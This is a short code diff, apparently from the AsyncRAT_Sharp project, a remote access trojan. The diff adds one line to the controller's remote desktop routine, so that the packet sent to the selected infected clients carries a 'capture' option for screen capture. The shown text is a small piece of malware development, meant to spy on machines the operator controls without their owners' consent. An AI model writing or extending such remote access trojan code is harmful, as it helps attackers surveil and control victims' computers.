@@ -578,6 +578,7 @@ namespace AsyncRAT_Sharp
                 {
                     MsgPack msgpack = new MsgPack();
                     msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
+                    msgpack.ForcePathObject("Option").AsString = "capture";
                     msgpack.ForcePathObject("Quality").AsInteger = 60;
                     foreach (ListViewItem itm in listView1.SelectedItems)
                     {
